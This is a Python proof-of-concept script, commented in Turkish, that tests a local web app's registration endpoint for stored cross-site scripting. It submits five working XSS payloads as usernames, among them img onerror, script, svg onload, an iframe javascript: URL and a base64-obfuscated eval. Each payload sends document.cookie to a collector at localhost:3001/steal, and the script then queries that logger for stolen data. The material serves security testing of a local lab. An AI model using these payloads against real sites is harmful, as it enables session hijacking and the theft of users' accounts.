"""
Gerçek XSS Test Senaryosu - Adım adım PoC
Bu script cookie çalmayı gerçek zamanlı olarak test eder
"""

import requests
import time
import json

# Test endpoint'leri
BACKEND_URL = "http://localhost:8000"
LOGGER_URL = "http://localhost:3001"

print("""
╔═══════════════════════════════════════════════════════════════╗
║             XSS SALDIRI SİMÜLASYONU - POC TEST               ║
╚═══════════════════════════════════════════════════════════════╝

Bu test 5 farklı XSS payload'ını gerçek sistemde test edecek.

⚠️ Test Adımları:
1. XSS payload ile kullanıcı kayıt et
2. Payload'un response'da sanitize edilip edilmediğini kontrol et
3. XSS başarılıysa, çalınan verileri logger'da gör

Başlıyoruz...
""")

# Test payload'ları
XSS_PAYLOADS = [
    {
        "name": "Basit Cookie Çalma",
        "payload": '<img src=x onerror="fetch(\'http://localhost:3001/steal?c=\'+document.cookie)">',
        "description": "Image onerror ile cookie çalma"
    },
    {
        "name": "Script Tag XSS",
        "payload": '<script>fetch("http://localhost:3001/steal?c="+document.cookie)</script>',
        "description": "Direkt script tag ile cookie çalma"
    },
    {
        "name": "SVG XSS",
        "payload": '<svg onload="fetch(\'http://localhost:3001/steal?c=\'+document.cookie)">',
        "description": "SVG onload ile XSS"
    },
    {
        "name": "iFrame XSS",
        "payload": '<iframe src="javascript:fetch(\'http://localhost:3001/steal?c=\'+document.cookie)">',
        "description": "iFrame javascript protocol ile XSS"
    },
    {
        "name": "Obfuscated XSS",
        "payload": '<img src=x onerror="eval(atob(\'ZmV0Y2goImh0dHA6Ly9sb2NhbGhvc3Q6MzAwMS9zdGVhbD9jPSIrZG9jdW1lbnQuY29va2llKQ==\'))">',
        "description": "Base64 encoded payload (decode: fetch cookie)"
    }
]

def test_xss_payload(payload_info):
    """Bir XSS payload'ını test et"""
    print(f"\n{'='*70}")
    print(f"🧪 Test: {payload_info['name']}")
    print(f"📝 Açıklama: {payload_info['description']}")
    print(f"💉 Payload: {payload_info['payload'][:60]}...")
    print(f"{'='*70}")
    
    # 1. XSS payload ile kullanıcı kayıt et
    try:
        register_data = {
            "username": payload_info['payload'],
            "email": f"xss-test-{int(time.time())}@test.com",
            "password": "password123"
        }
        
        print("\n📤 Backend'e payload gönderiliyor...")
        response = requests.post(
            f"{BACKEND_URL}/api/auth/register",
            json=register_data,
            timeout=5
        )
        
        print(f"📥 Response Status: {response.status_code}")
        
        # 2. Response'u analiz et
        if response.status_code == 201:
            print("✅ Kullanıcı oluşturuldu!")
            response_data = response.json()
            
            # Payload response'da sanitize edildi mi kontrol et
            if payload_info['payload'] in str(response_data):
                print("🔴 VULNERABLE: Payload sanitize EDİLMEDEN döndürüldü!")
                print(f"Response: {json.dumps(response_data, indent=2)}")
                
                return {
                    "status": "VULNERABLE",
                    "severity": "HIGH",
                    "response": response_data
                }
            else:
                print("🟢 SAFE: Payload sanitize edildi veya filtrelendi")
                return {
                    "status": "SAFE",
                    "severity": "INFO"
                }
        
        elif response.status_code == 400:
            print("⚠️ Bad Request - Payload reddedildi")
            print(f"Error: {response.text}")
            return {
                "status": "BLOCKED",
                "severity": "INFO"
            }
        
        elif response.status_code == 422:
            print("✅ Validation Error - Input validation çalışıyor")
            return {
                "status": "SAFE",
                "severity": "INFO"
            }
        
        else:
            print(f"❓ Beklenmeyen response: {response.status_code}")
            print(response.text)
            return {
                "status": "UNKNOWN",
                "severity": "MEDIUM"
            }
    
    except Exception as e:
        print(f"❌ Hata: {str(e)}")
        return {
            "status": "ERROR",
            "severity": "WARNING",
            "error": str(e)
        }

def check_stolen_data():
    """Logger'dan çalınan verileri kontrol et"""
    try:
        response = requests.get(f"{LOGGER_URL}/stats", timeout=3)
        if response.status_code == 200:
            stats = response.json()
            return stats
    except:
        pass
    return None

# Ana test döngüsü
results = []

print("\n🚀 XSS Testleri Başlatılıyor...\n")
time.sleep(2)

for payload_info in XSS_PAYLOADS:
    result = test_xss_payload(payload_info)
    result['payload_name'] = payload_info['name']
    results.append(result)
    time.sleep(1)  # Rate limiting'e takılmamak için

# Özet rapor
print("\n\n")
print("╔═══════════════════════════════════════════════════════════════╗")
print("║                    TEST SONUÇLARI ÖZET                        ║")
print("╚═══════════════════════════════════════════════════════════════╝")

vulnerable_count = sum(1 for r in results if r['status'] == 'VULNERABLE')
safe_count = sum(1 for r in results if r['status'] == 'SAFE')
blocked_count = sum(1 for r in results if r['status'] == 'BLOCKED')

print(f"\n📊 Toplam Test: {len(results)}")
print(f"🔴 Vulnerable: {vulnerable_count}")
print(f"🟢 Safe: {safe_count}")
print(f"⛔ Blocked: {blocked_count}")

print("\n📋 Detaylı Sonuçlar:")
for i, result in enumerate(results, 1):
    status_icon = {
        'VULNERABLE': '🔴',
        'SAFE': '🟢',
        'BLOCKED': '⛔',
        'ERROR': '❌',
        'UNKNOWN': '❓'
    }.get(result['status'], '❓')
    
    print(f"{i}. {status_icon} {result['payload_name']}: {result['status']}")

# Logger istatistiklerini kontrol et
print("\n\n📈 Logger İstatistikleri:")
stats = check_stolen_data()
if stats:
    print(f"Toplam Saldırı Tespit Edildi: {stats.get('total_attacks', 0)}")
    if stats.get('by_type'):
        print("Saldırı Tipleri:")
        for attack_type, count in stats['by_type'].items():
            print(f"  - {attack_type}: {count}")
else:
    print("Logger'a bağlanılamadı veya henüz saldırı tespit edilmedi")

print("\n" + "="*70)
print("\n✅ Test tamamlandı!")
print(f"\n📊 Logger Dashboard: {LOGGER_URL}")
print(f"📊 Logger Stats: {LOGGER_URL}/stats")
print("\n💡 XSS payload'u frontend'de render edildiğinde cookie çalma başarılı olacak.")
print("   Frontend'i tarayıcıda açıp test etmelisiniz.")
